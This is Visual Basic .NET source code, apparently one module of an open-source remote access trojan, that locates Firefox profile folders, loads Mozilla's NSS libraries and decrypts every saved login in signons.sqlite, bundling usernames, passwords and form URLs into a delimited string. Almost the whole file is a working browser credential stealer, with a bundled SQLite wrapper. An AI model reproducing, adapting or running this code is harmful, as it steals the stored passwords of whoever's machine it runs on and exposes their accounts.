Imports System
Imports System.Collections.Generic
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Data
Imports System.Collections

Imports System.IO
Imports OpenSource_RAT_Schäding.SQLiteWrapper

Module ff

    Sub Main()
        sFirefox()
        Console.ReadLine()
    End Sub
    Public Class SHITEMID
        Public Shared cb As Long
        Public Shared abID As Byte()
    End Class
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <DllImport("kernel32.dll")> Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Private NSS3 As IntPtr
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
    Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Public Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozcrt19.dll")
        LoadLibrary(MozillaPath & "nspr4.dll")
        LoadLibrary(MozillaPath & "plc4.dll")
        LoadLibrary(MozillaPath & "plds4.dll")
        LoadLibrary(MozillaPath & "ssutil3.dll")
        LoadLibrary(MozillaPath & "sqlite3.dll")
        LoadLibrary(MozillaPath & "nssutil3.dll")
        LoadLibrary(MozillaPath & "softokn3.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate2() As Long
    Public Function PK11_GetInternalKeySlot() As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
        Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
        Return dll()
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
    Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
        Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
        Return dll(slot, loadCerts, wincx)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
        Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
        Return dll(arenaOpt, outItemOpt, inStr, inLen)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function
    Public signon As String
    Public Function sFirefox() As String
        Try
            Dim TEMP As String = System.IO.Path.GetTempPath


            Dim FoundFile As Boolean = False
            Dim KeySlot As Long = 0
            Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
            Dim DefaultPath As String = Environment.GetEnvironmentVariable("APPDATA") & "\Mozilla\Firefox\Profiles"
            Dim Dirs As String() = Directory.GetDirectories(DefaultPath)
            For Each dir As String In Dirs
                If Not FoundFile Then
                    Dim Files As String() = Directory.GetFiles(dir)
                    For Each CurrFile As String In Files
                        If Not FoundFile Then
                            If System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite") Then
                                NSS_Init(dir)
                                signon = CurrFile
                            End If
                        Else

                            Exit For
                        End If
                    Next
                Else
                    Exit For
                End If
            Next

            Dim dataSource As String = signon
            Dim tSec As New TSECItem()
            Dim tSecDec As New TSECItem()
            Dim tSecDec2 As New TSECItem()
            Dim bvRet As Byte()
            Dim db As New SQLiteBase(dataSource)
            Dim ff As String = Nothing
            Dim table As DataTable = db.ExecuteQuery("SELECT * FROM moz_logins;")
            Dim table2 As DataTable = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;")
            'ff = ("Excluded hosts")
            'For Each row As DataRow In table2.Rows
            '    ff = ff & vbNewLine & (row("hostname").ToString())
            'Next
            KeySlot = PK11_GetInternalKeySlot()
            PK11_Authenticate(KeySlot, True, 0)
            'ff = ff & vbNewLine & ("Usernames & Passwords")
            ff = "FireFox;:;"
            For Each Zeile As System.Data.DataRow In table.Rows
                Dim formurl As String = System.Convert.ToString(Zeile("formSubmitURL").ToString())
                If formurl <> "" Then
                    ff = ff & (formurl) & ";:;"
                End If
                Dim se As New StringBuilder(Zeile("encryptedUsername").ToString())
                Dim hi2 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length)
                Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi2), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                    If tSecDec.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen)
                        ff = ff & (System.Text.Encoding.ASCII.GetString(bvRet)) & ";:;"
                    End If
                End If
                Dim se2 As New StringBuilder(Zeile("encryptedPassword").ToString())
                Dim hi22 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length)
                Dim item2 As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi22), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item2, tSecDec2, 0) = 0 Then
                    If tSecDec2.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec2.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen)
                        ff = ff & (System.Text.Encoding.ASCII.GetString(bvRet)) & ";:;~+~FireFox;:;"
                    End If
                End If
            Next
            Return ff
        Catch
            Return Nothing
        End Try
    End Function


End Module

Namespace SQLiteWrapper
    Public Class SQLiteBase
        <DllImport("kernel32")> _
        Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function GetProcessHeap() As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
        End Function
        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_errmsg(ByVal database As IntPtr) As IntPtr
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("sqlite3")> _
        Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
        End Function

        ' SQLite constants
        Private Const SQL_OK As Integer = 0
        Private Const SQL_ROW As Integer = 100
        Private Const SQL_DONE As Integer = 101
        Public Enum SQLiteDataTypes
            INT = 1
            FLOAT
            TEXT
            BLOB
            NULL
        End Enum
        Private database As IntPtr
        Public Sub New()
            database = IntPtr.Zero
        End Sub
        Public Sub New(ByVal baseName As [String])
            OpenDatabase(baseName)
        End Sub
        Public Sub OpenDatabase(ByVal baseName As [String])
            If sqlite3_open(StringToPointer(baseName), database) <> SQL_OK Then
                database = IntPtr.Zero
                Throw New Exception("Error with opening database " & baseName & "!")
            End If
        End Sub
        Public Sub CloseDatabase()
            If database <> IntPtr.Zero Then
                sqlite3_close(database)
            End If
        End Sub
        Public Function GetTables() As ArrayList
            Dim query As [String] = "SELECT name FROM sqlite_master " & "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" & "UNION ALL " & "SELECT name FROM sqlite_temp_master " & "WHERE type IN ('table','view') " & "ORDER BY 1"
            Dim table As DataTable = ExecuteQuery(query)
            Dim list As New ArrayList()
            For Each row As DataRow In table.Rows
                list.Add(row.ItemArray(0).ToString())
            Next
            Return list
        End Function
        Public Sub ExecuteNonQuery(ByVal query As [String])
            Dim [error] As IntPtr
            sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, [error])
            If [error] <> IntPtr.Zero Then
                Throw New Exception(("Error with executing non-query: """ & query & """!" & vbLf) + PointerToString(sqlite3_errmsg([error])))
            End If
        End Sub
        Public Function ExecuteQuery(ByVal query As [String]) As DataTable
            Dim statement As IntPtr
            Dim excessData As IntPtr
            sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), statement, excessData)
            Dim table As New DataTable()
            Dim result As Integer = ReadFirstRow(statement, table)
            While result = SQL_ROW
                result = ReadNextRow(statement, table)
            End While
            sqlite3_finalize(statement)
            Return table
        End Function
        Private Function ReadFirstRow(ByVal statement As IntPtr, ByRef table As DataTable) As Integer
            table = New DataTable("resultTable")
            Dim resultType As Integer = sqlite3_step(statement)
            If resultType = SQL_ROW Then
                Dim columnCount As Integer = sqlite3_column_count(statement)
                Dim columnName As [String] = ""
                Dim columnType As Integer = 0
                Dim columnValues As Object() = New Object(columnCount - 1) {}
                For i As Integer = 0 To columnCount - 1
                    columnName = PointerToString(sqlite3_column_name(statement, i))
                    columnType = sqlite3_column_type(statement, i)
                    Select Case columnType
                        Case CInt(SQLiteDataTypes.INT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Int32"))
                                columnValues(i) = sqlite3_column_int(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.FLOAT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Single"))
                                columnValues(i) = sqlite3_column_double(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.TEXT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.BLOB)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                                Exit Select
                            End If
                        Case Else
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = ""
                                Exit Select
                            End If
                    End Select
                Next
                table.Rows.Add(columnValues)
            End If
            Return sqlite3_step(statement)
        End Function
        Private Function ReadNextRow(ByVal statement As IntPtr, ByRef table As DataTable) As Integer
            Dim columnCount As Integer = sqlite3_column_count(statement)

            Dim columnType As Integer = 0
            Dim columnValues As Object() = New Object(columnCount - 1) {}

            For i As Integer = 0 To columnCount - 1
                columnType = sqlite3_column_type(statement, i)

                Select Case columnType
                    Case CInt(SQLiteDataTypes.INT)
                        If True Then
                            columnValues(i) = sqlite3_column_int(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.FLOAT)
                        If True Then
                            columnValues(i) = sqlite3_column_double(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.TEXT)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.BLOB)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                            Exit Select
                        End If
                    Case Else
                        If True Then
                            columnValues(i) = ""
                            Exit Select
                        End If
                End Select
            Next
            table.Rows.Add(columnValues)
            Return sqlite3_step(statement)
        End Function
        Private Function StringToPointer(ByVal str As [String]) As IntPtr
            If str Is Nothing Then
                Return IntPtr.Zero
            Else
                Dim encoding__1 As Encoding = Encoding.UTF8
                Dim bytes As [Byte]() = encoding__1.GetBytes(str)
                Dim length As UInteger = bytes.Length + 1
                Dim pointer As IntPtr = HeapAlloc(GetProcessHeap(), 0, DirectCast(length, UInt32))
                Marshal.Copy(bytes, 0, pointer, bytes.Length)
                Marshal.WriteByte(pointer, bytes.Length, 0)
                Return pointer
            End If
        End Function
        Private Function PointerToString(ByVal ptr As IntPtr) As [String]
            If ptr = IntPtr.Zero Then
                Return Nothing
            End If

            Dim encoding__1 As Encoding = Encoding.UTF8

            Dim length As Integer = GetPointerLenght(ptr)
            Dim bytes As [Byte]() = New [Byte](length - 1) {}
            Marshal.Copy(ptr, bytes, 0, length)
            Return encoding__1.GetString(bytes, 0, length)
        End Function
        Private Function GetPointerLenght(ByVal ptr As IntPtr) As Integer
            If ptr = IntPtr.Zero Then
                Return 0
            End If
            Return lstrlen(ptr)
        End Function
    End Class
End Namespace
